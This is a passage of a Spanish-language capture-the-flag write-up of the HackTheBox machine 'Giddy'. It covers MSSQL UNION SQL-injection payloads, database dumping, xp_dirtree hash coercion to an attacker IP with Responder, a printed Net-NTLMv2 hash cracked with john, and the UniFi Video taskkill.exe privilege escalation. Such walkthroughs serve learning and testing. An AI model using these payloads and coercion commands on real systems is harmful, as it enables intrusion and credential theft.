+<pre><code class="language-html">http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 25;#
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order25.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, 25 columnas, ahora tenemos que jugar con todas y ver en cuál de ellas logramos almacenar valores.</p>
+
+<h3 id="mvc-sqli-union-hola">Descubrimos en cuáles podemos almacenar texto <a href="#mvc-sqli-union-hola">🔗</a></h3>
+
+<hr />
+
+<ul>
+  <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks">Acá una guía de lo que debemos hacer - SQL injection UNION attacks</a>.</li>
+</ul>
+
+<p>Bien, pues creémonos un script superrápido que nos haga las 25 iteraciones (25 columnas) cambiando el valor de cada una por algún texto, si la respuesta del servidor no nos devuelve errores y por el contrario nos devuelve el texto, tendríamos una columna para jugar:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/search_column_union.py">search_column_union.py</a></p>
+</blockquote>
+
+<hr />
+
+<pre><code class="language-py">❱ python3 search_column_union.py 
+
+[+] Payload: 33 UNION SELECT NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '2' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '3' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '6' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '11' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '12' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '13' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '16' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '17' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '18' de nuestro payload nos permite escribir en la web
+</code></pre>
+
+<p>Perfectisimo, ya vemos varios campos, podemos jugar con cualquiera, tomaré la columna número <code>2</code> (:</p>
+
+<p>Antes de ponernos a dumpear las bases de datos debemos saber contra qué servicio <strong>SQL</strong> estamos enfrentándonos (algunos ya lo sabrán por los errores), para esto juguemos con la variable <code>@@version</code> y veamos:</p>
+
+<h3 id="mvc-sqli-version">Vemos la <u>versión</u> del servicio <u>SQL</u> <a href="#mvc-sqli-version">🔗</a></h3>
+
+<p>Ya podemos quitarnos el bucle e indicarle donde queremos que juegue, entonces empecemos a generar nuestro script para extraer toda la data, pero lo dicho, primero veamos la versión y así saber con qué sintaxis tenemos que seguir la explotación:</p>
+
+<pre><code class="language-sql">33 UNION SELECT campos_null,ELcampoQUEqueremosVERdeLAdb,los_otros_23_campos_null,..,..,..;-- -
+</code></pre>
+
+<p>Entonces como respuesta, en la web veríamos <code>ELcampoQUEqueremosVERdeLAdb</code>:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L98">Variables - extract_data_sqli.py</a></p>
+</blockquote>
+
+<p>Si lo ejecutamos vemos:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py -f '@@version'
+[+] Extrayendo la variable @@version del servicio SQL.
+[+] @@version: 
+    Microsoft SQL Server 2016 (SP1) (KB3182545) - 13.0.4001.0 (X64) 
+        Oct 28 2016 18:17:30 
+        Copyright (c) Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2016 Standard 6.3 &lt;X64&gt; (Build 14393: ) (Hypervisor)
+</code></pre>
+
+<p>Opa, estamos ante el servicio de bases de datos <a href="https://searchdatacenter.techtarget.com/es/definicion/SQL-Server">Microsoft SQL Server</a>, pues ahora sabemos que no podemos usar las mismas <strong>sentencias</strong> que usamos con <code>MySQL</code>; es mi primer approach contra este servicio y su explotación, así que vamos a darle duro y aprendemos juntos.</p>
+
+<p>Investigando encontramos varios recursos, podemos destacar 2:</p>
+
+<ul>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">MSSQL Injection Cheat Sheet</a>.</li>
+  <li><a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">MSSQL Practical Injection Cheat Sheet</a>.</li>
+  <li><a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html">Step By Step MSSQL Union Based Injection</a>.</li>
+</ul>
+
+<p>Vemos algunas variables para probar, intentemos ver el usuario que la base de datos actual:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py -f 'user_name()'
+[+] Extrayendo la variable user_name() del servicio SQL.
+[+] user_name(): Giddy\stacy
+</code></pre>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py -f 'user'
+[+] Extrayendo la variable user del servicio SQL.
+[+] user: Giddy\stacy
+</code></pre>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py -f 'system_user'
+[+] Extrayendo la variable system_user del servicio SQL.
+[+] system_user: giddy\stacy
+</code></pre>
+
+<p>Listones, tenemos al usuario <code>stacy</code> para guardarlo en nuestros pensamientos, ahora sí, empecemos a explotar estooooooooooooooooooo!!</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_letsgoseinfeld.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<h3 id="mvc-sqli-dbs">Extraemos las <u>bases de datos</u> actuales del servicio <u>MSSQL</u> <a href="#mvc-sqli-dbs">🔗</a></h3>
+
+<p>Con ayuda <a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">del primer recurso</a> referenciado antes, vemos una manera de extraer todas las bases de datos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_monkey_mssql_dbs.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Juguemos con la última línea, armemos un bucle por ejemplo de <strong>10</strong> bases de datos y veamos que surge:</p>
+
+<p>(Es prácticamente igual a nuestra inyección por campos, solo que en esta generamos un bucle para que vaya iterando entre las N bases de datos que existan)</p>
+
+<pre><code class="language-sql">33 UNION SELECT campos_null,DB_NAME(N),los_otros_23_campos_null,..,..,.. ORDER BY 1;-- -
+</code></pre>
+
+<p>Le indicamos el <a href="https://stackoverflow.com/questions/3445118/what-is-the-purpose-of-order-by-1-in-sql-select-statement">ORDER BY 1</a> para que lo que nos devuelva lo posicione en la primera columna (así nos es más fácil jugar con el script).</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L132">Databases - extract_data_sqli.py</a></p>
+</blockquote>
+
+<p>Ejecutamos yyyyyy:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py
+[+] Extrayendo las bases de datos del servicio MSSQL.
+
+[+] Base de datos [0]: Injection
+[+] Base de datos [1]: master
+[+] Base de datos [2]: tempdb
+[+] Base de datos [3]: model
+[+] Base de datos [4]: msdb
+</code></pre>
+
+<p>Bien, 5 bases de datos, juguemos inicialmente con <code>Injection</code> (que tiene un nombre moooooooooooooy llamativo) a ver que tablas tiene:</p>
+
+<h3 id="mvc-sqli-tables">Extraemos las <u>tablas</u> de la base de datos <u>Injection</u> <a href="#mvc-sqli-tables">🔗</a></h3>
+
+<p>Acá ya empezamos a limitar los resultados a <strong>1</strong> por fila, así lo único que debemos hacer es cambiar la fila en la que estamos pero siempre recibiendo un resultado.</p>
+
+<blockquote>
+  <p>Sé que se pudo haber hecho que una sola consulta arrojara tooodo y de ese toooodo extraer las cositas, pero me parecio más sencillo de implementar uno por uno.</p>
+</blockquote>
+
+<pre><code class="language-sql">33 UNION SELECT CAMPOS_NULL,table_name,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB].information_schema.tables ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -
+</code></pre>
+
+<p>Donde nos extraerá el nombre de las tablas que hay en la DB <code>nombreDB</code>, esto obtenido de la consulta <code>information_schema.tables</code> PEEEEEEERO en vez de <code>LIMIT</code> (como <code>MySQL</code>) usamos <code>OFFSET</code> y <code>FETCH</code> para limitar los resultados.</p>
+
+<p>Lo que hacemos es decirle:</p>
+
+<blockquote>
+  <p>“HEEEEY, limitame los resultados a solo uno (<code>FETCH FIRST 1 ROWS ONLY</code>) y ve cambiando la fila en la que te encuentras por favor (<code>OFFSET N</code> (donde N va de <strong>0</strong> a <strong>1</strong> a <strong>2</strong> y <strong>al numero que sea</strong>))”</p>
+</blockquote>
+
+<ul>
+  <li>Tomado de <a href="https://learnsql.com/cookbook/how-to-limit-rows-in-a-sql-server-result-set/">How to Limit Rows in a SQL Server Result Set</a>.</li>
+</ul>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L162">Tables - extract_data_sqli.py</a></p>
+</blockquote>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --dump Injection
+
+[+] Dumpeando tablas de la base de datos 'Injection': ✔
++----------------------+
+| Tablas DB: Injection |
++----------------------+
+| CreditCard           |
+| Product              |
+| ProductCategory      |
+| ProductSubcategory   |
++----------------------+
+</code></pre>
+
+<p>Jmmm, 4 no más, veamos la tabla <code>CreditCard</code> a ver que columnas tiene:</p>
+
+<h3 id="mvc-sqli-columns">Extraemos las <u>columnas</u> en la tabla <u>CreditCard</u> de la base de datos <u>Injection</u> <a href="#mvc-sqli-columns">🔗</a></h3>
+
+<p>Exactamente igual, solo que agregamos contra que tabla queremos trabajar:</p>
+
+<pre><code class="language-sql">33 UNION SELECT CAMPOS_NULL,column_name,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB].information_schema.columns WHERE table_name='nombreTABLA' ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -
+</code></pre>
+
+<p>Lo único que cambia es que extraemos las columnas de la DB <code>nombreDB</code> peeero que estén relacionadas con la tabla <code>nombreTABLA</code>, nada más.</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L189">Columns - extract_data_sqli.py</a></p>
+</blockquote>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --dump Injection CreditCard
+[+] Dumpeando columnas de la tabla 'CreditCard' en la base de datos 'Injection': ✔
+
++--------------+
+| Columnas     |
++--------------+
+| CardNumber   |
+| CardType     |
+| CreditCardID |
+| ExpMonth     |
+| ExpYear      |
+| ModifiedDate |
++--------------+
+</code></pre>
+
+<p>Ninguna columna es llamativa, jmmm, sin embargo intentemos ver algún valor, por ejemplo el de <code>CardType</code>:</p>
+
+<h3 id="mvc-sqli-data">Vemos la data de la columna <u>CardType</u> en la tabla <u>CreditCard</u> de la base de datos <u>Injection</u> <a href="#mvc-sqli-data">🔗</a></h3>
+
+<p>Y la más sencilla, solo le indicamos de donde queremos extraer QUÉ data.</p>
+
+<pre><code class="language-sql">33 UNION SELECT CAMPOS_NULL,nombreCAMPO,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB]..nombreTABLA ORDER BY 1 OFFSET %d ROWS FETCH FIRST 1 ROWS ONLY;-- -
+</code></pre>
+
+<p>Sencillito, le decimos: “extrae el campo <code>nombreCAMPO</code> de la tabla <code>nombreTABLA</code> que está en la DB <code>nombreDB</code>, muchas gracias”.</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py#L213">Dump data - extract_data_sqli.py</a></p>
+</blockquote>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --dump Injection CreditCard CardType
+[+] Extrayendo valores de la columna 'CardType' en Injection.CreditCard: ✔
+
++---------------+
+| CardType      |
++---------------+
+| ColonialVoice |
+| Distinguish   |
+| SuperiorCard  |
+| Vista         |
++---------------+
+</code></pre>
+
+<p>Pos si, los tipos de tarjetas de crédito 😑</p>
+
+<p>Ahora nos queda movernos entre las bases de datos, sus tablas y columnas a ver en cuáles encontramos algo útil…</p>
+
+<p>…</p>
+
+<h3 id="mvc-sqli-exec">Jugando con comandos de <u>MSSQL</u> <a href="#mvc-sqli-exec">🔗</a></h3>
+
+<p>Después de una ardua enumeración no encontramos nada de nada :(</p>
+
+<blockquote>
+  <p>Al menos nos sacamos un lindo lindo script.</p>
+</blockquote>
+
+<p>Buscando de que otras maneras podemos aprovecharnos de esta inyección, llegamos a esta gran lista de payloads para usar:</p>
+
+<ul>
+  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">PayloadAllTheThings - MSSQL Injection</a>.</li>
+</ul>
+
+<p>En él hay <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution">algunas maneras de ejecutar comandos</a> con la instrucción <a href="https://www.sqlshack.com/es/como-utilizar-el-procedimiento-extendido-xp_cmdshell/">xp_cmdshell</a>, pero probando cositas no obtenemos respuestas :(</p>
+
+<h3 id="smclient-mvc-sqli-exec-xpdirtree"><span style="color: red;">✘</span> Extraemos hash <u>Net-NTLMv2</u> del usuario <u>Stacy</u> <a href="#smclient-mvc-sqli-exec-xpdirtree">🔗</a></h3>
+
+<p>Si seguimos bajando llegamos al apartado <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-unc-path">MSSQL UNC Path</a>, el cual nos indica que <strong>MSSQL</strong> soporta el listado de archivos que existan en un directorio compartido a través de <strong>SMB</strong>, esto mediante la instrucción <a href="https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html">xp_dirtree</a>.</p>
+
+<p>Esto es interesante porque si logramos que el usuario de la base de datos (<code>Stacy</code>) haga la conexión contra nuestro folder compartido, llegara con ella un hash como método de autenticación, ese hash puede llegar a ser crackeable, pero claro, dependemos de cuan fuerte o no es la contraseña que hay por detrás.</p>
+
+<ul>
+  <li><a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">Explicación concreta de los tipos de hashes: <strong>LM</strong>, <strong>NTLM</strong> y <strong>Net-NTLMv2</strong></a>.</li>
+</ul>
+
+<p>Bien, pues compartamos una carpeta, usemos <a href="https://neil-fox.github.io/Impacket-usage-&amp;-detection/#smbclientpy">smbclient.py</a>:</p>
+
+<pre><code class="language-bash">❱ smbserver.py smbFolder $(pwd)
+</code></pre>
+
+<p>La carpeta compartida se llama <code>smbFolder</code> y toma la ruta actual en la que estemos (: ahora ejecutemos la instrucción a ver si llega alguna conexión:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --command "use master; exec xp_dirtree '\\\10.10.14.5\smbFolder'"
+
+[+] Enviando: ...=33; use master; exec xp_dirtree '\\10.10.14.5\smbFolder';-- -
+
+[+] Listonessss.
+</code></pre>
+
+<p>Si revisamos nuestra carpeta vemos una conexióóóóóóóóóóóóón:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_smbclient_stacy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Sip, <strong>Stacy</strong> hace dos conexiones por lo tanto vemos dos hashes, si nos <a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">guiamos del recurso anteriormente citado</a> sabemos que es un hash <strong>Net-NTLMv2</strong>, podemos jugar con <code>John The Ripper</code> e intentar crackearlo:</p>
+
+<p>Lo guardamos en un archivo:</p>
+
+<pre><code class="language-bash">❱ cat stacy.hash 
+Stacy::GIDDY:aaaaaaaa:7314d853e80f9b14ffd777487e0ded22:0101000000000000800c43548681d7018508a21f5f6d94bf00000000010010007a007800530076004200560076004300020010004a007800660055004800650073007900030010007a007800530076004200560076004300040010004a00780066005500480065007300790007000800800c43548681d70106000400020000000800300030000000000000000000000000300000483c10b9e519cd8ccad95791e38cd0e00f9987c059e89a051afd94f7f5f7fb820a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000
+</code></pre>
+
+<p>Y ahora con <code>john</code>:</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 stacy.hash 
+</code></pre>
+
+<p>Pero la respuesta nos deja muertos:</p>
+
+<blockquote>
+  <p><span style="color: yellow;">No password hashes loaded (see FAQ)</span></p>
+</blockquote>
+
+<h3 id="responder-mvc-sqli-exec-xpdirtree"><span style="color: green;">✔</span> Extraemos hash <u>Net-NTLMv2</u> del usuario <u>Stacy</u> <a href="#responder-mvc-sqli-exec-xpdirtree">🔗</a></h3>
+
+<p>Jmm F, intentando e intentando cositas no logramos respuesta distinta a esa. Leyendo el post de los hashes hablan de una herramienta llamada <a href="https://github.com/lgandx/Responder">responder</a>, la cual (entre muuuchas cosas) también nos sirve como intermediario para cuando alguien intenta conectarse o interactuar con nuestro sistema. Intentemos con ella a ver si vemos algo distinto:</p>
+
+<p>Al ser la primera vez que lo uso, debemos descargarlo:</p>
+
+<ol>
+  <li>Vamos al repo de la tool.</li>
+  <li>En nuestra terminal hacemos <code>git clone https://github.com/lgandx/Responder.git</code>.</li>
+  <li>Y ya tendríamos el programa <code>Responder.py</code>, lo renombraré a <code>responder.py</code> para que sea más sencillo el llamado (que pereza escribir la primera en mayus 😊)</li>
+</ol>
+
+<p>En internet encontramos <a href="https://www.a2secure.com/en/blog/how-to-use-responder-to-capture-netntlm-and-grab-a-shell/">este recurso</a> que nos muestra como usar <code>Responder</code> para capturar hashes <code>NetNTLM</code>.</p>
+
+<p>Si queremos validar el tráfico de alguna interfaz, por ejemplo de la <code>tun0</code>, que seria donde esta <strong>HTB</strong>:</p>
+
+<pre><code class="language-bash">❱ ifconfig 
+docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        ...
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        ...
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        ...
+tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
+        inet 10.10.14.5  netmask 255.255.254.0  destination 10.10.14.5
+        ...
+</code></pre>
+
+<p>Y ahora ejecutaríamos con el <code>responder</code> que analice el tráfico de esa interfaz:</p>
+
+<pre><code class="language-bash">❱ responder.py -I tun0 -A  
+</code></pre>
+
+<p>Nos desplegara algunas opciones activas o inactivas del programa y al final nos mostrara que esta en escucha por la interfaz <code>tun0</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_responder_tun0_A.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ahora bien, para capturar el hash de <code>Stacy</code> (que es el user que hace la petición) debemos quitar el parámetro <code>-A</code>:</p>
+
+<pre><code class="language-bash">❱ responder.py -I tun0
+</code></pre>
+
+<p>Lo siguiente será enviar una petición desde el servicio <strong>MSSQL</strong> a nuestra <strong>IP</strong> servida en la interfaz <code>tun0</code>, o sea, a la <code>10.10.14.5</code> y ver que pasa en el <strong>responder</strong>:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --command "use master; exec xp_dirtree '\\\10.10.14.5'"
+
+[+] Enviando: ...=33; use master; exec xp_dirtree '\\10.10.14.5';-- -
+
+[+] Listonessss.
+</code></pre>
+
+<p>Yyyyyyyyyyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_responder_stacy_hash.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, también obtenemos el hash <code>Net-NTLMv2</code> de <strong>Stacy</strong>, hagamos lo mismo de antes, lo tomamos, lo guardamos en un archivo y jugamos con <code>john</code>:</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 stacy.hash 
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_john_stacy_hash_cracked.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>PERFECTISIIIIIIIIIIIIIIIIIIMO, ahora sí logramos que tome el hash y mejor aún, que lo crackeeeeeeeeeeeeeeeeeeee.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_football_letsgo.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Que locura, lindo lindo…</p>
+
+<p>Si recordamos en nuestro escaneo de <code>nmap</code>, el servicio <code>WinRM</code> por el puerto <code>5985</code> esta activo, entre las cosas que podemos hacer con él, ahí un recurso que lo aprovecha para generar una consola <strong>PowerShell</strong> llamado <a href="https://www.hackplayers.com/2019/10/evil-winrm-shell-winrm-para-pentesting.html">evil-winrm</a>, usémoslo y de una validemos si las credenciales son funcionales:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_stacyPS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listones ahora sí, estamos dentro del sistema como el usuario <code>Stacy</code> (:</p>
+
+<p>…</p>
+
+<p>Otra alternativa hubiera sido el usar la interfaz web que encontramos en nuestra enumeración web, la recuerdan? Había un recurso llamado <code>Remote</code>, si intentamos logearnos con esas credenciales, conseguimos una <strong>PowerShell</strong> en la web (que va un toque más rápida que la que tenemos con <code>evil-winrm</code>):</p>
+
+<ul>
+  <li><a href="https://practical365.com/powershell-web-access-just-how-practical-is-it/">Con este recurso vemos un ejemplo de uso de la interfaz web</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote_loginCREDS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote_loginDONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si una nos falla o algo así, ya tenemos un respaldo :P sigamos…</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>En el directorio en el que salimos cuando obtenemos nuestra <strong>PowerShell</strong> vemos un archivo con un nombre algo extraño:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; dir
+
+    Directory: C:\Users\Stacy\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/17/2018   9:36 AM              6 unifivideo
+...
+</code></pre>
+
+<p>Me dio curiosidad y busqué que era eso, la curiosidad nos dio vida:</p>
+
+<blockquote>
+  <p>“unifi-video”, tambien llamado “UniFi” es una solucion de video vigilancia, o sea, de camaras de seguridad.</p>
+</blockquote>
+
+<p>Si le agregamos a nuestra búsqueda <code>"exploit"</code> vemos algo interesante:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_unifi_exploitDB.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Lindo, un exploit que nos permite escalar privilegios, es más o menos viejito (concuerda con las fechas de la máquina) así que veámoslo a ver que nos comenta.</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/43390">Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation</a>.</li>
+</ul>
+
+<p>Tenemos varias cosas a destacar:</p>
+
+<blockquote>
+  <p>Ubiquiti UniFi Video for Windows is installed to <code>C:\ProgramData\\unifi-video\</code> by default.</p>
+</blockquote>
+
+<p>Validemos si efectivamente existe la ruta y tiene el contenido del programa:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; dir C:\ProgramData\\unifi-video\
+
+    Directory: C:\ProgramData\\unifi-video
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        6/16/2018   9:54 PM                bin
+d-----        6/16/2018   9:55 PM                conf
+d-----        6/16/2018  10:56 PM                data
+d-----        6/16/2018   9:54 PM                email
+d-----        6/16/2018   9:54 PM                fw
+d-----        6/16/2018   9:54 PM                lib
+d-----        7/26/2018  11:23 AM                logs
+d-----        6/16/2018   9:55 PM                webapps
+d-----        6/16/2018   9:55 PM                work
+-a----        7/26/2017   6:10 PM         219136 avService.exe
+-a----        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
+-a----        6/17/2018  11:23 AM      534204321 hs_err_pid1992.mdmp
+-a----        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
+-a----        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
+-a----        7/26/2017   6:10 PM          48640 UniFiVideo.exe
+-a----        7/26/2017   6:10 PM          32038 UniFiVideo.ico
+-a----        6/16/2018   9:54 PM          89050 Uninstall.exe
+...
+</code></pre>
+
+<p>Perfecto, vamos bien :)</p>
+
+<blockquote>
+  <p>Default permissions on the <code>C:\ProgramData\\unifi-video</code> folder are inherited from <code>C:\ProgramData</code> and are <strong>not explicitly overridden</strong>, which <strong>allows all users</strong>, even <strong>unprivileged</strong> ones, to <strong>append and write files to the application directory</strong>.</p>
+</blockquote>
+
+<p>Validemos si es cierto que tenemos permisos de escritura con ayuda de <code>icacls</code>:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData&gt; icacls unifi-video
+unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+            BUILTIN\Administrators:(I)(OI)(CI)(F)
+            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+            BUILTIN\Users:(I)(OI)(CI)(RX)
+            BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)
+
+Successfully processed 1 files; Failed processing 0 files
+</code></pre>
+
+<p>Pues si, como <code>BUILTIN\Users</code> tenemos varios permisos, pero los interesantes son:</p>
+
+<ul>
+  <li><code>WD</code>: “escribir datos/agregar archivo”.</li>
+  <li><code>AD</code>: “anexar datos/agregar subdirectorio”.</li>
+</ul>
+
+<p>Les dejo una <a href="https://www.pantallazos.es/2018/03/windows-server-icacls-modificar-permisos-NTFS.html">lista</a> de los permisos que encontramos y su significado.</p>
+
+<p>Vamos aún mejor, veamos de que nos sirve saber esto:</p>
+
+<blockquote>
+  <p>Upon <strong>start</strong> and <strong>stop</strong> of the service, it tries to <strong>load and execute</strong> the file at <code>C:\ProgramData\\unifi-video\taskkill.exe</code>. However this file does not exist in the application directory by default at all.</p>
+</blockquote>
+
+<p>Y llega el remate:</p>
+
+<blockquote>
+  <p>By <strong>copying an arbitrary</strong> <code>taskkill.exe</code> to <code>C:\ProgramData\\unifi-video\</code> as an unprivileged user, it is therefore possible to <strong>escalate privileges and execute arbitrary code as NT AUTHORITY/SYSTEM</strong>.</p>
+</blockquote>
+
